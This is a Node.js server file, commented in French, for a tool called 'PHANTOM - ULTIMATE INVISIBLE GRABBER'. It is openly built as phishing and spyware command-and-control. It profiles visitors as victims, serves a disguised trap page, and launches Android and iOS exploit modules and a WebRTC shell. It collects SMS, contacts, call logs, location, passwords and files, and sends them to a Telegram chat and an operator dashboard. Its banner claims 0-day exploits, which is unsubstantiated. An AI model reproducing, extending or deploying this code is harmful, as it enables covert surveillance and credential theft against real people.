require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const fs = require('fs-extra');
const crypto = require('crypto-js');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const TelegramBot = require('node-telegram-bot-api');

// Modules personnalisés
const Camouflage = require('./modules/camouflage');
const ExploitAndroid = require('./modules/exploit-android');
const ExploitIOS = require('./modules/exploit-ios');
const Mutation = require('./modules/mutation');
const WebRTCShell = require('./modules/webrtc-shell');
const AIPhishing = require('./modules/ai-phishing');

const app = express();
const server = http.createServer(app);
const io = socketIO(server);

// ============================================
// SÉCURITÉ
// ============================================
app.use(helmet({
    contentSecurityPolicy: false,
    hidePoweredBy: true
}));
app.use(compression());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Trop de requêtes'
});
app.use('/api/', limiter);

// ============================================
// INITIALISATION
// ============================================
const DATA_DIR = path.join(__dirname, 'data');
const TEMPLATES_DIR = path.join(__dirname, 'public', 'templates');

fs.ensureDirSync(DATA_DIR);
fs.ensureDirSync(TEMPLATES_DIR);

// Base de données en mémoire
const victims = new Map();
const sessions = new Map();

// Telegram bot
const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: false });

// ============================================
// FONCTIONS UTILITAIRES
// ============================================

/**
 * Génère un ID unique
 */
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

/**
 * Chiffre les données
 */
function encryptData(data, key = process.env.ENCRYPTION_KEY) {
    return crypto.AES.encrypt(JSON.stringify(data), key).toString();
}

/**
 * Déchiffre les données
 */
function decryptData(encrypted, key = process.env.ENCRYPTION_KEY) {
    const bytes = crypto.AES.decrypt(encrypted, key);
    return JSON.parse(bytes.toString(crypto.enc.Utf8));
}

/**
 * Analyse l'User-Agent
 */
function analyzeUserAgent(ua) {
    const result = {
        browser: 'unknown',
        os: 'unknown',
        device: 'unknown',
        isMobile: false,
        isAndroid: false,
        isIOS: false,
        isWebView: false,
        vulnerabilities: []
    };
    
    if (ua.includes('Android')) {
        result.os = 'Android';
        result.isAndroid = true;
        result.isMobile = true;
        
        // Version Android
        const match = ua.match(/Android (\d+)/);
        if (match) {
            result.androidVersion = parseInt(match[1]);
            
            // Vulnérabilités connues
            if (result.androidVersion <= 10) {
                result.vulnerabilities.push('webview_rce');
            }
            if (result.androidVersion <= 12) {
                result.vulnerabilities.push('intent_scheme');
            }
        }
        
        if (ua.includes('wv')) {
            result.isWebView = true;
            result.vulnerabilities.push('webview_exposed');
        }
    }
    
    if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
        result.os = 'iOS';
        result.isIOS = true;
        result.isMobile = true;
        
        const match = ua.match(/OS (\d+)_/);
        if (match) {
            result.iosVersion = parseInt(match[1]);
            
            if (result.iosVersion <= 14) {
                result.vulnerabilities.push('webkit_rce');
            }
            if (result.iosVersion <= 16) {
                result.vulnerabilities.push('safari_uxss');
            }
        }
    }
    
    return result;
}

/**
 * Sauvegarde les données
 */
async function saveVictimData(victimId, type, data) {
    const victimDir = path.join(DATA_DIR, victimId);
    await fs.ensureDir(victimDir);
    
    const filename = `${type}.enc`;
    const filepath = path.join(victimDir, filename);
    
    const encrypted = encryptData({
        timestamp: Date.now(),
        type,
        data
    });
    
    await fs.appendFile(filepath, encrypted + '\n');
    
    return filepath;
}

/**
 * Envoie à Telegram
 */
async function sendToTelegram(victimId, type, data, priority = 'normal') {
    const victim = victims.get(victimId);
    if (!victim) return;
    
    let emoji = '📦';
    switch(type) {
        case 'sms': emoji = '💬'; break;
        case 'contacts': emoji = '👥'; break;
        case 'calls': emoji = '📞'; break;
        case 'location': emoji = '📍'; break;
        case 'credentials': emoji = '🔑'; break;
        case 'files': emoji = '📁'; break;
    }
    
    const message = `
${emoji} **PHANTOM - ${type.toUpperCase()}**
🆔 **Victime:** \`${victimId}\`
🌍 **IP:** ${victim.ip}
📱 **OS:** ${victim.os} ${victim.osVersion || ''}
🕐 **Heure:** ${new Date().toLocaleString()}

\`\`\`
${typeof data === 'string' ? data.substring(0, 1500) : JSON.stringify(data, null, 2).substring(0, 1500)}
\`\`\`

${priority === 'high' ? '⚠️ **HAUTE PRIORITÉ** ⚠️' : ''}
    `;
    
    try {
        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error('Telegram error:', error.message);
    }
}

// ============================================
// MIDDLEWARE D'ANALYSE
// ============================================
app.use(async (req, res, next) => {
    const victimId = generateUUID();
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'];
    const analysis = analyzeUserAgent(ua);
    
    // Créer la victime
    victims.set(victimId, {
        id: victimId,
        ip,
        ua,
        ...analysis,
        firstSeen: Date.now(),
        lastSeen: Date.now(),
        data: {
            sms: [],
            contacts: [],
            calls: [],
            locations: [],
            credentials: [],
            files: []
        },
        exploits: [],
        sessions: []
    });
    
    // Sauvegarder les infos
    await saveVictimData(victimId, 'info', {
        ip,
        ua,
        analysis,
        headers: req.headers
    });
    
    // Notifier Telegram
    await sendToTelegram(victimId, 'info', {
        ip,
        os: analysis.os,
        browser: analysis.browser,
        device: analysis.device,
        vulnerabilities: analysis.vulnerabilities
    }, 'high');
    
    console.log(`🎯 [${victimId}] Nouvelle cible: ${ip} (${analysis.os})`);
    
    req.victimId = victimId;
    req.victim = victims.get(victimId);
    
    next();
});

// ============================================
// ROUTE PRINCIPALE - CAMOUFLAGE INTELLIGENT
// ============================================
app.get('/', async (req, res) => {
    const { victimId, victim } = req;
    
    // Choisir le meilleur camouflage
    const template = await Camouflage.selectTemplate(victim);
    const mutatedHTML = await Mutation.generate(template, victim);
    
    // Envoyer la page piège
    res.send(mutatedHTML);
});

// ============================================
// API DE RÉCEPTION DES DONNÉES
// ============================================
app.post('/api/collect', async (req, res) => {
    const { victimId } = req;
    const data = req.body;
    
    const victim = victims.get(victimId);
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    
    victim.lastSeen = Date.now();
    
    // Traiter selon le type
    switch(data.type) {
        case 'system':
            victim.system = data.data;
            await saveVictimData(victimId, 'system', data.data);
            break;
            
        case 'sms':
            victim.data.sms.push(...data.data);
            await saveVictimData(victimId, 'sms', data.data);
            
            if (data.data.length > 0) {
                await sendToTelegram(victimId, 'sms', 
                    data.data.slice(0, 5).map(s => 
                        `[${s.address}] ${s.body.substring(0, 50)}`
                    ).join('\n')
                );
            }
            break;
            
        case 'contacts':
            victim.data.contacts.push(...data.data);
            await saveVictimData(victimId, 'contacts', data.data);
            await sendToTelegram(victimId, 'contacts', 
                `${data.data.length} contacts récupérés`
            );
            break;
            
        case 'calls':
            victim.data.calls.push(...data.data);
            await saveVictimData(victimId, 'calls', data.data);
            break;
            
        case 'location':
            victim.data.locations.push(data.data);
            await saveVictimData(victimId, 'location', data.data);
            await sendToTelegram(victimId, 'location', 
                `📍 ${data.data.lat}, ${data.data.lng}\n🎯 Précision: ${data.data.accuracy}m`
            , 'high');
            break;
            
        case 'credentials':
            victim.data.credentials.push(data.data);
            await saveVictimData(victimId, 'credentials', data.data);
            await sendToTelegram(victimId, 'credentials', 
                `🔑 ${data.data.site}\n👤 ${data.data.username}\n🔐 ${data.data.password}`
            , 'high');
            break;
            
        case 'files':
            victim.data.files.push(data.data);
            await saveVictimData(victimId, 'files', data.data);
            break;
            
        case 'exploit_result':
            victim.exploits.push(data.data);
            console.log(`💥 [${victimId}] Exploit réussi: ${data.data.type}`);
            break;
    }
    
    res.json({ success: true });
});

// ============================================
// WEBSOCKET POUR COMMUNICATION TEMPS RÉEL
// ============================================
io.on('connection', (socket) => {
    const { victimId } = socket.handshake.query;
    
    if (victimId) {
        // Connexion d'une victime
        console.log(`🔌 [${victimId}] Victime connectée via WebSocket`);
        
        socket.join(`victim-${victimId}`);
        
        // Lancer les exploits appropriés
        const victim = victims.get(victimId);
        
        if (victim.isAndroid) {
            ExploitAndroid.launch(socket, victim);
        }
        
        if (victim.isIOS) {
            ExploitIOS.launch(socket, victim);
        }
        
        // Lancer WebRTC Shell
        WebRTCShell.init(socket, victim);
        
        socket.on('data', async (data) => {
            // Relayer les données
            io.to('dashboard').emit('victim_data', {
                victimId,
                data
            });
        });
        
        socket.on('disconnect', () => {
            console.log(`🔌 [${victimId}] Victime déconnectée`);
        });
    } else {
        // Connexion du dashboard
        socket.join('dashboard');
        console.log('📊 Dashboard connecté');
        
        // Envoyer la liste des victimes
        const victimList = Array.from(victims.entries()).map(([id, v]) => ({
            id,
            ip: v.ip,
            os: v.os,
            firstSeen: v.firstSeen,
            lastSeen: v.lastSeen,
            dataCount: {
                sms: v.data.sms.length,
                contacts: v.data.contacts.length,
                calls: v.data.calls.length,
                locations: v.data.locations.length
            }
        }));
        
        socket.emit('victims', victimList);
    }
});

// ============================================
// DASHBOARD
// ============================================
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
});

// ============================================
// API POUR LE DASHBOARD
// ============================================
app.get('/api/victims', (req, res) => {
    const list = Array.from(victims.entries()).map(([id, v]) => ({
        id,
        ip: v.ip,
        os: v.os,
        firstSeen: v.firstSeen,
        lastSeen: v.lastSeen,
        dataCount: {
            sms: v.data.sms.length,
            contacts: v.data.contacts.length,
            calls: v.data.calls.length,
            locations: v.data.locations.length,
            credentials: v.data.credentials.length
        }
    }));
    
    res.json(list);
});

app.get('/api/victim/:id', (req, res) => {
    const victim = victims.get(req.params.id);
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    res.json(victim);
});

app.get('/api/download/:id/:type', async (req, res) => {
    const { id, type } = req.params;
    const filepath = path.join(DATA_DIR, id, `${type}.enc`);
    
    if (await fs.pathExists(filepath)) {
        const encrypted = await fs.readFile(filepath, 'utf8');
        const lines = encrypted.split('\n').filter(l => l);
        const decrypted = lines.map(l => decryptData(l));
        
        res.json(decrypted);
    } else {
        res.status(404).json({ error: 'File not found' });
    }
});

// ============================================
// DÉMARRAGE
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════════════════════╗
    ║     🔥 PHANTOM - ULTIMATE INVISIBLE GRABBER v5.0        ║
    ╠══════════════════════════════════════════════════════════╣
    ║  🎯 LIEN: ${process.env.DOMAIN || 'http://localhost:'+PORT}        ║
    ║  📊 DASHBOARD: ${process.env.DOMAIN || 'http://localhost:'+PORT}/dashboard ║
    ║  🤖 TELEGRAM: ${process.env.TELEGRAM_CHAT_ID ? '✅' : '❌'}                       ║
    ╠══════════════════════════════════════════════════════════╣
    ║  ⚡ FONCTIONNALITÉS ULTIMES:                             ║
    ║  ✓ Camouflage IA intelligent                             ║
    ║  ✓ Exploits Android 0-day                               ║
    ║  ✓ Exploits iOS 0-day                                   ║
    ║  ✓ Mutation du payload                                  ║
    ║  ✓ WebRTC P2P shell                                     ║
    ║  ✓ Phishing IA                                          ║
    ║  ✓ Chiffrement militaire                                ║
    ║  ✓ Auto-destruction                                     ║
    ╚══════════════════════════════════════════════════════════╝
    `);
});
